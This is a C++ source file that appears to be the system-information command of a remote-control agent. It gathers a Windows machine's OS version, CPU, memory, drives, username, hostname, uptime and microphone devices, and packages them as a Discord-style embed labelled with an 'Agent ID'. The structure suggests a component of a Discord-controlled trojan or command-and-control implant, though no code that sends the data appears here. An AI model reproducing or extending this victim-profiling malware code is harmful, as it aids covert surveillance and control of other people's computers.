#ifdef ENABLE_SYSINFO
#include "commands/sysinfo.h"

RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
std::string CreateJSONPayload2(const std::unordered_map<std::string, std::string>& sys_info, const std::string& agentIdStr, bool success) {
    json jsonPayload = {
        {"embeds", {
            {
                {"title", success ? "**System Information**" : "**System Information Retrieval Failed**"},
                {"description", "Agent ID: " + agentIdStr},
                {"color", success ? 0x00FF00 : 0xFF0000},
                {"fields", json::array()},
                {"footer", {{"text", success ? "Success" : "Error"}}}
            }
        }}
    };

    if (!success) {
        jsonPayload["embeds"][0]["fields"].push_back({
            {"name", "Error"},
            {"value", "Failed to retrieve system information"},
            {"inline", false}
            });
        return jsonPayload.dump(4);
    }

    auto& fields = jsonPayload["embeds"][0]["fields"];
    for (const auto& [key, value] : sys_info) {
        fields.push_back({
            {"name", key + ":"},
            {"value", value.empty() ? "Not available" : value},
            {"inline", false}
            });
    }

    return jsonPayload.dump(4);
}

std::unordered_map<std::string, std::string> GetSystemInfo() {
    std::unordered_map<std::string, std::string> sys_info;
    RTL_OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    std::string windows_version = "Unknown";
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (rtlGetVersion && rtlGetVersion(&osvi) == 0) {
            std::string os_name = "Windows";
            if (osvi.dwMajorVersion == 10) {
                if (osvi.dwBuildNumber >= 22000) {
                    os_name += " 11";
                }
                else {
                    os_name += " 10";
                }
            }
            windows_version = os_name + " (Build " + std::to_string(osvi.dwBuildNumber) + ")";
        }
    }
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t productName[256];
        DWORD nameSize = sizeof(productName);
        if (RegQueryValueExW(hKey, L"ProductName", NULL, NULL, (LPBYTE)productName, &nameSize) == ERROR_SUCCESS) {
            std::wstring prodName(productName, nameSize / sizeof(wchar_t));
            std::string regProductName = std::string(prodName.begin(), prodName.end());
            if ((osvi.dwBuildNumber >= 22000 && regProductName.find("Windows 11") != std::string::npos) ||
                (osvi.dwBuildNumber < 22000 && regProductName.find("Windows 10") != std::string::npos)) {
                windows_version = regProductName + " (Build " + std::to_string(osvi.dwBuildNumber) + ")";
            }
        }

        DWORD installDate;
        DWORD dateSize = sizeof(installDate);
        if (RegQueryValueExW(hKey, L"InstallDate", NULL, NULL, (LPBYTE)&installDate, &dateSize) == ERROR_SUCCESS) {
            time_t installTime = installDate;
            char dateStr[26];
            ctime_s(dateStr, sizeof(dateStr), &installTime);
            windows_version += ", Installed: " + std::string(dateStr, 24);
        }
        RegCloseKey(hKey);
    }
    sys_info["Windows Version"] = windows_version;

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    std::string cpu_info = std::to_string(si.dwNumberOfProcessors) + " Cores";
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t cpuName[256];
        DWORD cpuNameSize = sizeof(cpuName);
        if (RegQueryValueExW(hKey, L"ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &cpuNameSize) == ERROR_SUCCESS) {
            std::wstring cpu(cpuName, cpuNameSize / sizeof(wchar_t));
            cpu_info = std::string(cpu.begin(), cpu.end()) + ", " + std::to_string(si.dwNumberOfProcessors) + " Cores";
        }

        DWORD cpuSpeed;
        DWORD speedSize = sizeof(cpuSpeed);
        if (RegQueryValueExW(hKey, L"~MHz", NULL, NULL, (LPBYTE)&cpuSpeed, &speedSize) == ERROR_SUCCESS) {
            cpu_info += ", " + std::to_string(cpuSpeed) + " MHz";
        }
        RegCloseKey(hKey);
    }
    sys_info["CPU"] = cpu_info;

    MEMORYSTATUSEX mem = { sizeof(mem) };
    if (GlobalMemoryStatusEx(&mem)) {
        double totalGB = mem.ullTotalPhys / (1024.0 * 1024 * 1024);
        double availGB = mem.ullAvailPhys / (1024.0 * 1024 * 1024);
        double usedPercent = ((totalGB - availGB) / totalGB) * 100.0;
        sys_info["RAM"] = "Total: " + std::to_string(static_cast<int>(totalGB)) + " GB, Available: " +
            std::to_string(static_cast<int>(availGB)) + " GB, Used: " +
            std::to_string(static_cast<int>(usedPercent)) + "%";
    }
    else {
        sys_info["RAM"] = "Unknown";
    }

    std::string drives_info = "";
    wchar_t drives[256];
    if (GetLogicalDriveStringsW(256, drives)) {
        for (wchar_t* drive = drives; *drive != L'\0'; drive += wcslen(drive) + 1) {
            ULARGE_INTEGER freeBytes, totalBytes;
            if (GetDiskFreeSpaceExW(drive, &freeBytes, &totalBytes, NULL)) {
                std::wstring drive_str(drive);
                std::string drive_entry = std::string(drive_str.begin(), drive_str.end()) + " " +
                    "Total: " + std::to_string(totalBytes.QuadPart / (1024 * 1024 * 1024)) + " GB, " +
                    "Free: " + std::to_string(freeBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";

                UINT driveType = GetDriveTypeW(drive);
                switch (driveType) {
                case DRIVE_FIXED: drive_entry += ", HDD/SSD"; break;
                case DRIVE_REMOVABLE: drive_entry += ", Removable"; break;
                case DRIVE_CDROM: drive_entry += ", CD/DVD"; break;
                default: drive_entry += ", Unknown Type"; break;
                }

                wchar_t fsName[32];
                if (GetVolumeInformationW(drive, NULL, 0, NULL, NULL, NULL, fsName, 32)) {
                    std::wstring fs(fsName);
                    drive_entry += ", " + std::string(fs.begin(), fs.end());
                }
                drives_info += drive_entry + "\n";
            }
        }
    }
    sys_info["Drives"] = drives_info.empty() ? "No drives detected" : drives_info;

    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameW(username, &username_len)) {
        std::wstring uname(username);
        sys_info["Username"] = std::string(uname.begin(), uname.end());
    }
    else {
        sys_info["Username"] = "Unknown";
    }

    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hostname_len = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(hostname, &hostname_len)) {
        std::wstring hname(hostname);
        sys_info["Hostname"] = std::string(hname.begin(), hname.end());
    }
    else {
        sys_info["Hostname"] = "Unknown";
    }

    ULONGLONG uptimeMs = GetTickCount64();
    ULONGLONG seconds = uptimeMs / 1000;
    ULONGLONG minutes = seconds / 60;
    ULONGLONG hours = minutes / 60;
    ULONGLONG days = hours / 24;
    std::string uptime = std::to_string(days) + "d " +
        std::to_string(hours % 24) + "h " +
        std::to_string(minutes % 60) + "m " +
        std::to_string(seconds % 60) + "s";
    sys_info["Uptime"] = uptime;

    sys_info["Microphone"] = GetAudioDevices();

    return sys_info;
}

std::string GetAudioDevices() {
    std::string result;
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return "Error initializing COM";

    IMMDeviceEnumerator* pEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
        __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
    if (FAILED(hr)) {
        CoUninitialize();
        return "Error creating device enumerator";
    }

    IMMDeviceCollection* pCollection = NULL;
    hr = pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection);
    if (FAILED(hr)) {
        pEnumerator->Release();
        CoUninitialize();
        return "Error enumerating devices";
    }

    UINT count;
    pCollection->GetCount(&count);
    if (count == 0) {
        result = "None detected";
    }
    else {
        for (UINT i = 0; i < count; i++) {
            IMMDevice* pDevice = NULL;
            pCollection->Item(i, &pDevice);
            if (pDevice) {
                IPropertyStore* pProps = NULL;
                pDevice->OpenPropertyStore(STGM_READ, &pProps);
                if (pProps) {
                    PROPVARIANT varName;
                    PropVariantInit(&varName);
                    hr = pProps->GetValue(PKEY_Device_FriendlyName, &varName);
                    if (SUCCEEDED(hr) && varName.vt == VT_LPWSTR) {
                        std::wstring ws(varName.pwszVal);
                        result += std::string(ws.begin(), ws.end());
                    }
                    PropVariantClear(&varName);
                    pProps->Release();
                }
                if (i < count - 1) result += "\n";
                pDevice->Release();
            }
        }
    }

    pCollection->Release();
    pEnumerator->Release();
    CoUninitialize();
    return result.empty() ? "None detected" : result;
}
#endif